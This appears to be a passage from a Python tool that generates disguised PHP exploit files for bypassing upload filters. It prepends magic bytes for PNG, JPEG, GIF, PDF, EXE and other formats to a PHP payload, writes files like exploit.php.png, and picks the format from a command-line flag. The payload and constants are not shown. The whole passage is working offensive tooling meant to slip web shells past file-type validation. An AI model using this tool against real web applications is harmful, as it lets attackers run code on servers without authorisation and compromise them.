# FUNCTIONS FOR DIFFERENT 
def create_png(payload):
	with open("exploit.php.png","wb") as fb:
		fb.write(PNG_magicBytes+payload)

def create_jpeg(payload):
	with open("exploit.php.jpg","wb") as fb:
		fb.write(JPEG_magicBytes+payload)

def create_exe(payload):
	with open("exploit.php.exe","wb") as fb:
		fb.write(EXE_magicBytes+payload)

def create_elf(payload):
	with open("exploit.php.o","wb") as fb:
		fb.write(ELF_magicBytes+payload)

def create_gif(payload):
	with open("exploit.php.gif","wb") as fb:
		fb.write(GIF_magicBytes+payload)

def create_bmp(payload):
	with open("exploit.php.bmp","wb") as fb:
		fb.write(BMP_magicBytes+payload)

def create_iso(payload):
	with open("exploit.php.iso","wb") as fb:
		fb.write(ISO_magicBytes+payload)


def create_jar(payload):
	with open("exploit.php.jar","wb") as fb:
		fb.write(JAR_magicBytes+payload)

def create_pdf(payload):
	with open("exploit.php.pdf","wb") as fb:
		fb.write(PDF_magicBytes+payload)

def create_all(payload):
	create_bmp(payload)
	create_elf(payload)
	create_gif(payload)
	create_exe(payload)
	create_pdf(payload)
	create_png(payload)
	create_iso(payload)
	create_jpeg(payload)
	create_jar(payload)


parser = ap.ArgumentParser(description='Script to create PHP Payloads with custom file signatures', epilog='~ with <3 by X64M')

parser.add_argument('-s', '--signature', metavar='target_signature', action='store' , type=str,
		help='accepted inputs : png,jpg,exe,elf,gif,bmp,jar,pdf,iso; \'-s all\' will create all.')

args = parser.parse_args()
sig_select = args.signature



if(sig_select == 'png'):
	create_png(payload)
	print("DONE")
elif(sig_select == 'bmp'):
	create_bmp(payload)
	print("DONE")
elif(sig_select == 'jpg'):
	create_jpeg(payload)
	print("DONE")
elif(sig_select == 'gif'):
	create_gif(payload)
	print("DONE")
elif(sig_select == 'exe'):
	create_exe(payload)
	print("DONE")
elif(sig_select == 'elf'):
	create_elf(payload)
	print("DONE")
elif(sig_select == 'iso'):
	create_iso(payload)
	print("DONE")
elif(sig_select == 'jar'):
	create_jar(payload)
	print("DONE")
elif(sig_select == 'pdf'):
	create_pdf(payload)
	print("DONE")
elif(sig_select == 'all'):
	print("Generating all.")
	create_all(payload)
	print("DONE")
else:
	print("Requested Signature not Recogonised")
